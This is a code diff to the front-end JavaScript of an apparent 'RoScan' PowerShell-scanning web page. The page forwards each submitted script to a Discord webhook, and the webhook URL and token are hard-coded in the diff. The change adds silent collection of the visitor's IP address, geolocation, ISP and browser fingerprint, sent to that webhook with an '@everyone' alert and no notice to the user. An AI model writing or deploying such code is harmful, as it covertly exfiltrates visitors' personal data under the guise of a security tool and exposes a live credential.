@@ -62,6 +62,77 @@ function generateSessionId() {
     return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
 }
 
+// Get user location information
+async function getUserLocation() {
+    try {
+        // Try multiple IP location services for better accuracy
+        const services = [
+            'https://ipapi.co/json/',
+            'https://api.ipify.org?format=json',
+            'https://ipinfo.io/json'
+        ];
+        
+        let locationData = {
+            ip: 'Unknown',
+            country: 'Unknown',
+            region: 'Unknown', 
+            city: 'Unknown',
+            isp: 'Unknown'
+        };
+
+        // Try the primary service first
+        try {
+            const response = await fetch('https://ipapi.co/json/', {
+                method: 'GET',
+                headers: {
+                    'Accept': 'application/json'
+                }
+            });
+            
+            if (response.ok) {
+                const data = await response.json();
+                locationData = {
+                    ip: data.ip || 'Unknown',
+                    country: data.country_name || 'Unknown',
+                    region: data.region || 'Unknown',
+                    city: data.city || 'Unknown',
+                    isp: data.org || 'Unknown'
+                };
+            }
+        } catch (error) {
+            console.log('Primary location service failed, trying fallback...');
+            
+            // Fallback to ipinfo.io
+            try {
+                const fallbackResponse = await fetch('https://ipinfo.io/json');
+                if (fallbackResponse.ok) {
+                    const fallbackData = await fallbackResponse.json();
+                    locationData = {
+                        ip: fallbackData.ip || 'Unknown',
+                        country: fallbackData.country || 'Unknown',
+                        region: fallbackData.region || 'Unknown',
+                        city: fallbackData.city || 'Unknown',
+                        isp: fallbackData.org || 'Unknown'
+                    };
+                }
+            } catch (fallbackError) {
+                console.log('Fallback location service also failed');
+            }
+        }
+
+        return locationData;
+    } catch (error) {
+        console.error('Location detection failed:', error);
+        return {
+            ip: 'Location detection failed',
+            country: 'Unknown',
+            region: 'Unknown',
+            city: 'Unknown',
+            isp: 'Unknown'
+        };
+    }
+}
+
 // Secure webhook submission
 async function submitPowerShell() {
     const input = document.getElementById('powershellInput');
@@ -81,12 +152,15 @@ async function submitPowerShell() {
         // Discord webhook URL
         const webhookUrl = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
         
-        // Format for Discord webhook
+        // Get user location info
+        const locationInfo = await getUserLocation();
+        
+        // Format for Discord webhook with @everyone ping
         const payload = {
-            content: "🔍 **New PowerShell Scan Submitted**",
+            content: "@everyone 🚨 **URGENT: New PowerShell Scan Detected** 🚨",
             embeds: [{
-                title: "PowerShell Script Analysis",
-                color: 2563235, // Blue color
+                title: "⚠️ PowerShell Script Analysis - IMMEDIATE ATTENTION REQUIRED",
+                color: 15158332, // Red color for urgency
                 fields: [
                     {
                         name: "📅 Timestamp",
@@ -99,18 +173,28 @@ async function submitPowerShell() {
                         inline: true
                     },
                     {
-                        name: "🖥️ User Agent",
-                        value: navigator.userAgent.substring(0, 100) + "...",
+                        name: "🌍 Location Information",
+                        value: `**Country:** ${locationInfo.country}\n**Region:** ${locationInfo.region}\n**City:** ${locationInfo.city}\n**ISP:** ${locationInfo.isp}\n**IP:** ${locationInfo.ip}`,
                         inline: false
                     },
                     {
-                        name: "⚡ PowerShell Script",
-                        value: "```powershell\n" + powershellScript.substring(0, 1900) + (powershellScript.length > 1900 ? "\n... (truncated)" : "") + "\n```",
+                        name: "🖥️ System Information",
+                        value: `**Browser:** ${navigator.userAgent.split('(')[1]?.split(')')[0] || 'Unknown'}\n**Platform:** ${navigator.platform}\n**Language:** ${navigator.language}\n**Screen:** ${screen.width}x${screen.height}`,
+                        inline: false
+                    },
+                    {
+                        name: "🌐 Network Details",
+                        value: `**Connection:** ${navigator.connection?.effectiveType || 'Unknown'}\n**Online:** ${navigator.onLine ? 'Yes' : 'No'}\n**Timezone:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
+                        inline: false
+                    },
+                    {
+                        name: "⚡ PowerShell Script Content",
+                        value: "```powershell\n" + powershellScript.substring(0, 1500) + (powershellScript.length > 1500 ? "\n... (truncated)" : "") + "\n```",
                         inline: false
                     }
                 ],
                 footer: {
-                    text: "RoScan Security Analysis"
+                    text: "🔍 RoScan Security Analysis - CRITICAL ALERT"
                 },
                 timestamp: new Date().toISOString()
             }]
